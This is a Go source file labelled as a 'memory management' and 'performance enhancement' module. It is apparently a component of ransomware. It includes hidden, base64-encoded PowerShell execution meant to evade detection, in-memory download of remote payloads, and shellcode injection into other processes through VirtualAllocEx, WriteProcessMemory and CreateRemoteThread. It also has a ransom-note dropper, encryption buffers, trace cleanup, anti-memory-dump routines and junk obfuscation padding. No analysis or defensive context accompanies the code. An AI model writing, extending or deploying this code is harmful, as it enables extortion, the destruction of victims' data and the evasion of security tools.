// OBFUSCATED
// Memory management system
// Performance enhancement module
package memory

import (
	"bytes"
	"encoding/base64"
	"io"
	"net/http"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

// Download file directly to memory without touching disk
func DownloadToMemory(url string) ([]byte, error) {
	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Read directly into memory buffer
	buf := new(bytes.Buffer)
	_, err = io.Copy(buf, resp.Body)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// Set wallpaper from memory buffer without writing to disk
func SetWallpaperFromMemory(imageData []byte) error {
	// Create anonymous pipe for in-memory data transfer
	r, w, err := os.Pipe()
	if err != nil {
		return err
	}

	// Write image data to pipe in background
	go func() {
		defer w.Close()
		w.Write(imageData)
	}()

	// Use PowerShell to read from pipe and set wallpaper in memory
	psCmd := d("cG93ZXJzaGVsbA==")
	psArg := d("LUNvbW1hbmQ=")

	// PowerShell script that reads from stdin and sets wallpaper
	script := `
		$bytes = [System.IO.File]::ReadAllBytes('` + r.Name() + `')
		$tempPath = [System.IO.Path]::GetTempFileName() + '.png'
		[System.IO.File]::WriteAllBytes($tempPath, $bytes)
		Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport("user32.dll")]public static extern int SystemParametersInfo(int a,int b,string c,int d);}'
		[W]::SystemParametersInfo(20,0,$tempPath,3)
		Start-Sleep -Seconds 2
		Remove-Item $tempPath -Force
	`

	cmd := exec.Command(psCmd, psArg, script)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.Run()
}

// Execute PowerShell commands entirely in memory
func ExecutePSInMemory(script string) error {
	// Encode script to base64 to avoid detection
	encoded := base64.StdEncoding.EncodeToString([]byte(script))

	psCmd := d("cG93ZXJzaGVsbA==")
	cmd := exec.Command(psCmd, "-NoProfile", "-NonInteractive", "-EncodedCommand", encoded)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.Run()
}

// Clear memory buffer securely
func SecureWipeMemory(data []byte) {
	for i := range data {
		data[i] = 0
	}
}

// Memory mapping structures for Windows API
var (
	kernel32           = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
	virtualAllocEx     = kernel32.NewProc(d("VmlydHVhbEFsbG9jRXg="))
	writeProcessMemory = kernel32.NewProc(d("V3JpdGVQcm9jZXNzTWVtb3J5"))
	createRemoteThread = kernel32.NewProc(d("Q3JlYXRlUmVtb3RlVGhyZWFk"))
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_CREATE_THREAD  = 0x0002
	PROCESS_VM_OPERATION   = 0x0008
	PROCESS_VM_WRITE       = 0x0020
	PROCESS_VM_READ        = 0x0010
)

// Inject shellcode into remote process memory
func InjectIntoProcess(pid int, shellcode []byte) error {
	// Open target process
	handle, err := syscall.OpenProcess(
		PROCESS_CREATE_THREAD|
			PROCESS_VM_OPERATION|
			PROCESS_VM_WRITE|
			PROCESS_VM_READ,
		false,
		uint32(pid),
	)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(handle)

	// Allocate memory in remote process
	addr, _, err := virtualAllocEx.Call(
		uintptr(handle),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return err
	}

	// Write shellcode to allocated memory
	var written uintptr
	_, _, err = writeProcessMemory.Call(
		uintptr(handle),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if written == 0 {
		return err
	}

	// Create remote thread to execute shellcode
	_, _, err = createRemoteThread.Call(
		uintptr(handle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	return err
}

// Store ransom note in memory and write on-demand
type MemoryNote struct {
	content []byte
	paths   []string
}

func NewMemoryNote(content string) *MemoryNote {
	return &MemoryNote{
		content: []byte(content),
		paths:   make([]string, 0),
	}
}

func (m *MemoryNote) DropNote(path string) error {
	// Write directly from memory, no intermediate storage
	err := os.WriteFile(path, m.content, 0666)
	if err == nil {
		m.paths = append(m.paths, path)
	}
	return err
}

func (m *MemoryNote) CleanupTraces() {
	// Securely wipe memory
	SecureWipeMemory(m.content)
	m.paths = nil
}

// In-memory encryption buffer to avoid temp files
type EncryptionBuffer struct {
	plaintext  []byte
	ciphertext []byte
	metadata   []byte
}

func NewEncryptionBuffer(size int) *EncryptionBuffer {
	return &EncryptionBuffer{
		plaintext:  make([]byte, size),
		ciphertext: make([]byte, size),
		metadata:   make([]byte, 0),
	}
}

func (e *EncryptionBuffer) Clear() {
	SecureWipeMemory(e.plaintext)
	SecureWipeMemory(e.ciphertext)
	SecureWipeMemory(e.metadata)
}

// Memory pool for reusing buffers
type MemoryPool struct {
	buffers chan *EncryptionBuffer
}

func NewMemoryPool(size, count int) *MemoryPool {
	pool := &MemoryPool{
		buffers: make(chan *EncryptionBuffer, count),
	}

	for i := 0; i < count; i++ {
		pool.buffers <- NewEncryptionBuffer(size)
	}

	return pool
}

func (p *MemoryPool) Get() *EncryptionBuffer {
	return <-p.buffers
}

func (p *MemoryPool) Put(buf *EncryptionBuffer) {
	buf.Clear()
	p.buffers <- buf
}

// Anti-memory dump: Fill unused memory with random data
func PoisonMemory(size int) {
	data := make([]byte, size)
	for i := range data {
		data[i] = byte(time.Now().UnixNano() % 256)
	}
	// Keep reference so GC doesn't collect
	time.Sleep(1 * time.Millisecond)
	_ = data
}



// Obfuscation padding
func obf_80912() {
    _ = 694
    var _ = "uDL8LLy7rEr3UodLBtxzUFEy5Ys8Tjra1n7RpUxgDpJ6wyAiCb"
}


// Obfuscation padding
func obf_33288() {
    _ = 5193
    var _ = "KVZQlLCzHvfEmlBzVUPXRJe7RWJ9lLodprXA3PFzdH7wFbfjnh"
}


// Obfuscation padding
func obf_31618() {
    _ = 5180
    var _ = "5qJZGCwIqSKBzE0iDHvhkwrlpKVVrntwo3dFJr7u7N2WMuxMNt"
}


// Obfuscation padding
func obf_54489() {
    _ = 5691
    var _ = "vy4hGr27nGjyY60D2l8E3x6AazyYqV3H1JepnBhfecXbEPyKbo"
}


// Obfuscation padding
func obf_21302() {
    _ = 4576
    var _ = "XalOd5WW18YJZ5ieOj84xBdW2jeAsm0KJbWJRdYiTcLwui42vO"
}
